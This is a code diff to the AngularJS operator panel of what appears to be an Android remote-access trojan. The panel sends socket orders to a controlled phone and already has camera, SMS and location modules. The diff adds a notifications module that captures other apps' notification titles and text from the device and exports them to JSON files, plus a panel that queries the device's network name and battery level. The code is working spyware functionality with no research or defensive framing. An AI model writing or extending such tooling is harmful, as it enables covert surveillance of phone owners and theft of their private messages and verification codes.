@@ -45,7 +45,14 @@ app.config(function ($routeProvider) {
         .when("/location", {
             templateUrl: "./views/location.html",
             controller: "LocCtrl"
-        });
+        })
+        .when("/notifications", {  // TAMBAHKAN INI
+            templateUrl: "./views/notifications.html",
+            controller: "NotifCtrl"
+        })
+        .when("/about", {
+            templateUrl: "./views/about.html"
+        })
 });
 
 
@@ -111,9 +118,92 @@ app.controller("LabCtrl", function ($scope, $rootScope, $location) {
 
 });
 
+//.......................About Controllers..........................
 
+//-----------------------Notification Controller (notifications.htm)------------------------
+// Notification controller
+app.controller("NotifCtrl", function ($scope, $rootScope) {
+    $NotifCtrl = $scope;
+    $NotifCtrl.notifications = [];
+    $NotifCtrl.notificationEnabled = false;
+    var notification = 'x0000nf'; // event name untuk notifikasi
 
+    $NotifCtrl.$on('$destroy', () => {
+        // release resources, cancel Listener...
+        socket.removeAllListeners(notification);
+    });
 
+    // Check notification access status on load
+    $NotifCtrl.checkStatus = () => {
+        $rootScope.Log('Checking Notification Access Status...');
+        socket.emit(ORDER, { order: notification, extra: 'status' });
+    };
+
+    // Open notification settings
+    $NotifCtrl.openSettings = () => {
+        $rootScope.Log('Opening Notification Settings on Device...');
+        socket.emit(ORDER, { order: notification, extra: 'openSettings' });
+    };
+
+    // Clear notification history
+    $NotifCtrl.clearHistory = () => {
+        $NotifCtrl.notifications = [];
+        $rootScope.Log('Notification History Cleared', CONSTANTS.logStatus.SUCCESS);
+    };
+
+    // Export notifications to file
+    $NotifCtrl.exportNotifications = () => {
+        if ($NotifCtrl.notifications.length == 0) {
+            $rootScope.Log('No Notifications to Export', CONSTANTS.logStatus.FAIL);
+            return;
+        }
+
+        var jsonData = JSON.stringify($NotifCtrl.notifications, null, 2);
+        var filePath = path.join(downloadsPath, "Notifications_" + Date.now() + ".json");
+        
+        $rootScope.Log("Saving Notifications...");
+        fs.outputFile(filePath, jsonData, (error) => {
+            if (error)
+                $rootScope.Log("Saving " + filePath + " Failed", CONSTANTS.logStatus.FAIL);
+            else
+                $rootScope.Log("Notifications Saved on " + filePath, CONSTANTS.logStatus.SUCCESS);
+        });
+    };
+
+    // Listen for notification events
+    socket.on(notification, (data) => {
+        // Check if it's a status response
+        if (data.hasOwnProperty('enabled')) {
+            $NotifCtrl.notificationEnabled = data.enabled;
+            if (data.enabled) {
+                $rootScope.Log('Notification Access is Enabled', CONSTANTS.logStatus.SUCCESS);
+            } else {
+                $rootScope.Log('Notification Access is Disabled', CONSTANTS.logStatus.FAIL);
+            }
+            $NotifCtrl.$apply();
+        }
+        // Check if it's a notification data
+        else if (data.packageName) {
+            var notif = {
+                id: data.id || Date.now(),
+                packageName: data.packageName,
+                title: data.title || 'No Title',
+                text: data.text || data.bigText || 'No Content',
+                bigText: data.bigText || '',
+                postTime: data.postTime,
+                key: data.key,
+                receivedAt: new Date().toLocaleString()
+            };
+
+            $NotifCtrl.notifications.unshift(notif); // Add to beginning of array
+            $rootScope.Log('[¡] New Notification from ' + notif.packageName + ': ' + notif.title, CONSTANTS.logStatus.INFO);
+            $NotifCtrl.$apply();
+        }
+    });
+
+    // Auto-check status on load
+    $NotifCtrl.checkStatus();
+});
 
 
 //-----------------------Camera Controller (camera.htm)------------------------
@@ -352,6 +442,53 @@ app.controller("SMSCtrl", function ($scope, $rootScope) {
 });
 
 
+app.controller("AboutCtrl", function ($scope, $rootScope) {
+
+    const $AboutCtrl = $scope;
+
+    // Initialize variables
+    $AboutCtrl.networkName = "Loading...";
+    $AboutCtrl.battery = "Loading...";
+
+    const orders = {
+        network: CONSTANTS.orders.networkName,
+        battery: CONSTANTS.orders.battery  // new order for battery
+    };
+
+    // Cleanup socket listeners on destroy
+    $AboutCtrl.$on("$destroy", () => {
+        Object.values(orders).forEach(order => socket.removeAllListeners(order));
+    });
+
+    // Request network name and battery info
+    $rootScope.Log("Requesting Network Name & Battery info...");
+    Object.values(orders).forEach(order => socket.emit(ORDER, { order }));
+
+    // Listen for network name
+    socket.on(orders.network, (data) => {
+        if (data && data.networkName) {
+            $AboutCtrl.networkName = data.networkName;
+            $rootScope.Log("Network name received", CONSTANTS.logStatus.SUCCESS);
+        } else {
+            $AboutCtrl.networkName = "Unknown";
+            $rootScope.Log("Failed to get Network name", CONSTANTS.logStatus.FAIL);
+        }
+        $AboutCtrl.$applyAsync();
+    });
+
+    // Listen for battery info
+    socket.on(orders.battery, (data) => {
+        if (data && typeof data.level !== "undefined") {
+            $AboutCtrl.battery = `${data.level}%`;
+            $rootScope.Log("Battery info received", CONSTANTS.logStatus.SUCCESS);
+        } else {
+            $AboutCtrl.battery = "Unknown";
+            $rootScope.Log("Failed to get battery info", CONSTANTS.logStatus.FAIL);
+        }
+        $AboutCtrl.$applyAsync();
+    });
+
+});
 
 
 
